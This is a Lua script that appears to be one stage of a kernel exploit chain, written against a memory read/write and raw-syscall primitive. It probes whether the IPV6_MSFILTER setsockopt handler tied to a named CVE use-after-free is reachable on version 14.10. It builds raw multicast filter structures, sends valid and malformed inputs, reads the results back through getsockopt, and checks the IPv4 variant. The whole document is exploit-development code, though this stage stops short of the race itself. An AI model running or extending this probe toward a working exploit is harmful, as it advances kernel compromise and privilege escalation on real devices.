-- CRASH_CLASS: MODERATE
-- PROBE 50e2: IPV6_MSFILTER reachability (CVE-2026-49412)
--
-- Based on ng643's 50e, rewritten without memory.write_byte.
-- Tests whether setsockopt(IPPROTO_IPV6=41, IPV6_MSFILTER=74) reaches
-- a handler on 14.10. This is the precondition for the UAF race.
-- Does NOT attempt the race — single-threaded reachability only.

print("=== PROBE 50e2: IPV6_MSFILTER REACHABILITY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function zero(addr, size)
    for i = 0, size - 1, 4 do wd(addr + i, 0) end
end

local AF_INET6     = 28
local AF_INET      = 2
local SOCK_DGRAM   = 2
local IPPROTO_UDP  = 17
local IPPROTO_IPV6 = 41
local IPPROTO_IP   = 0
local IPV6_MSFILTER = 74
local IP_MSFILTER   = 74
local IPV6_JOIN_GROUP = 12
local MCAST_INCLUDE  = 1
local SIN6_SIZE     = 28
local SS_SIZE       = 128
local MSFR_SIZE     = 148

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

local function tag(name, fn)
    local ok, rv = pcall(fn)
    if ok then
        local r = N(rv)
        print(string.format("  %s ret=%d", name, r))
        return true, r
    end
    print(string.format("  %s PFAIL", name))
    return false, -999
end

-- sockaddr_in6 builder (dword-only)
-- Builds at buf: sin6_len=sa_len, sin6_family=AF_INET6, port=0, flow=0,
-- addr = [b0, b1, 0...0, last_byte], scope=0
-- Padded to SS_SIZE (128) with zeros
local function write_sin6(buf, b0, b1, sa_len, last_byte)
    sa_len = sa_len or SIN6_SIZE
    last_byte = last_byte or 1
    zero(buf, SS_SIZE)
    -- +0: {sin6_len, sin6_family, port_hi, port_lo} LE
    wd(buf, sa_len + AF_INET6 * 256)
    -- +8: addr[0..3] LE: b0 + b1*256
    wd(buf + 8, b0 + b1 * 256)
    -- +20: addr[12..15] LE: last_byte at position 3 (addr[15])
    wd(buf + 20, last_byte * 16777216)
end

-- ipv6_mreq builder: 16 bytes addr + 4 bytes ifindex
local function write_mreq6(buf, ifindex)
    zero(buf, 24)
    -- addr[0..3]: ff02 = 0xFF + 0x02*256
    wd(buf, 255 + 2 * 256)
    -- addr[12..15]: ::1 = 1 at byte 15
    wd(buf + 12, 16777216)
    -- ifindex at +16
    wd(buf + 16, ifindex)
end

-- __msfilterreq builder: ifindex(4) fmode(4) nsrcs(4) group(128) srcs_ptr(8)
local function write_msfr(buf, ifindex, fmode, nsrcs, srcs_ptr, group_b0, group_sa_len)
    zero(buf, MSFR_SIZE)
    wd(buf, ifindex)
    wd(buf + 4, fmode)
    wd(buf + 8, nsrcs)
    -- group sockaddr_in6 at +12 (ff02::1 by default)
    write_sin6(buf + 12, group_b0 or 0xFF, 0x02, group_sa_len or SIN6_SIZE, 1)
    -- srcs pointer at +140
    if srcs_ptr then
        wq(buf + 140, srcs_ptr)
    end
end

-- === A: UDPv6 socket + join ff02::1 ===
print("[A] UDPv6 socket + multicast join")
local ok_s, fd = pcall(function()
    return sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
end)
fd = ok_s and N(fd) or -999
print("  socket(AF_INET6, DGRAM, UDP) fd=" .. fd)

if fd < 0 then
    print("  ABORT: no UDPv6 socket")
    print("=== 50e2 COMPLETE ===")
    return
end

if not alive() then print("DIED after socket!") return end

local joined = false
local mreq = memory.alloc(32)
for _, ifx in ipairs({1, 0}) do
    write_mreq6(N(mreq), ifx)
    local jok, jrv = tag(string.format("JOIN_GROUP if=%d", ifx), function()
        return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6),
            uint64(IPV6_JOIN_GROUP), mreq, uint64(20))
    end)
    if not alive() then print("  DIED on join!") return end
    if jok and jrv == 0 then
        joined = true
        print("  JOINED on ifindex=" .. ifx)
        break
    end
end

if not joined then
    print("  NOTE: join failed; MSFILTER calls still test handler presence")
end

-- === B: MSFILTER setsockopt (the real test) ===
print("")
print("[B] IPV6_MSFILTER setsockopt")
local msfr = memory.alloc(256)
local srcs = memory.alloc(256)
local MSFR = N(msfr)
local SRCS = N(srcs)

-- Source address: 2001::1 (unicast)
write_sin6(SRCS, 0x20, 0x01, SIN6_SIZE, 1)

-- B1: nsrcs=0, no sources pointer
write_msfr(MSFR, 1, MCAST_INCLUDE, 0, nil)
tag("MSFILTER nsrcs=0 null-srcs", function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_MSFILTER), msfr, uint64(MSFR_SIZE))
end)
if not alive() then print("  DIED!") return end

-- B2: nsrcs=1, valid sources pointer
write_msfr(MSFR, 1, MCAST_INCLUDE, 1, srcs)
tag("MSFILTER nsrcs=1 valid-srcs", function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_MSFILTER), msfr, uint64(MSFR_SIZE))
end)
if not alive() then print("  DIED!") return end

-- === C: Malformed inputs (map error paths) ===
print("")
print("[C] Malformed MSFILTER inputs")

-- C1: invalid fmode
write_msfr(MSFR, 1, 99, 0, nil)
tag("MSFILTER fmode=99", function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_MSFILTER), msfr, uint64(MSFR_SIZE))
end)
if not alive() then print("  DIED!") return end

-- C2: unicast group (b0=0x00 instead of 0xFF)
write_msfr(MSFR, 1, MCAST_INCLUDE, 0, nil, 0x00)
tag("MSFILTER group=unicast", function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_MSFILTER), msfr, uint64(MSFR_SIZE))
end)
if not alive() then print("  DIED!") return end

-- C3: wrong sa_len (16 instead of 28)
write_msfr(MSFR, 1, MCAST_INCLUDE, 0, nil, 0xFF, 16)
tag("MSFILTER ss_len=16", function()
    return sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_MSFILTER), msfr, uint64(MSFR_SIZE))
end)
if not alive() then print("  DIED!") return end

-- === D: Readback via getsockopt ===
print("")
print("[D] MSFILTER getsockopt readback")
local out = memory.alloc(256)
local outlen = memory.alloc(16)
local OUT = N(out)
zero(OUT, 256)
wd(N(outlen), 256)

write_msfr(MSFR, 1, MCAST_INCLUDE, 0, nil)
local gok, grv = tag("MSFILTER getsockopt", function()
    return sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_MSFILTER), out, outlen)
end)
if not alive() then print("  DIED!") return end

if gok and grv == 0 then
    local n0 = rd(OUT) or 0
    local n4 = rd(OUT + 4) or 0
    local n8 = rd(OUT + 8) or 0
    print(string.format("  out[0,4,8]=%d,%d,%d", n0, n4, n8))
    -- Dump first 32 bytes
    local line = "  "
    for i = 0, 28, 4 do
        local v = rd(OUT + i) or 0
        if v < 0 then v = v + 4294967296 end
        line = line .. string.format("%08X ", v)
    end
    print(line)
end

-- === E: IPv4 parity (IP_MSFILTER, level 0) ===
print("")
print("[E] IPv4 IP_MSFILTER parity")
local ok4, fd4 = pcall(function()
    return sc_socket(uint64(AF_INET), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
end)
fd4 = ok4 and N(fd4) or -999
print("  socket(AF_INET, DGRAM, UDP) fd=" .. fd4)

if fd4 >= 0 then
    -- Build msfr with IPv4 sockaddr_in group 224.0.0.1
    zero(MSFR, MSFR_SIZE)
    wd(MSFR, 1)              -- ifindex
    wd(MSFR + 4, MCAST_INCLUDE) -- fmode
    wd(MSFR + 8, 0)          -- nsrcs
    -- sockaddr_in at +12: {sin_len=16, sin_family=2, sin_port=0, sin_addr=224.0.0.1}
    -- +12: dword = 16 + 2*256 = 0x0210
    wd(MSFR + 12, 16 + AF_INET * 256)
    -- +16: sin_addr = 224.0.0.1 = 0xE0 + 0 + 0 + 0x01*2^24
    wd(MSFR + 16, 224 + 16777216)

    tag("IP_MSFILTER nsrcs=0", function()
        return sc_setsockopt(uint64(fd4), uint64(IPPROTO_IP),
            uint64(IP_MSFILTER), msfr, uint64(MSFR_SIZE))
    end)
    if not alive() then print("  DIED!") return end
    pcall(function() sc_close(uint64(fd4)) end)
end

-- Cleanup
pcall(function() sc_close(uint64(fd)) end)

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 50e2 COMPLETE ===")
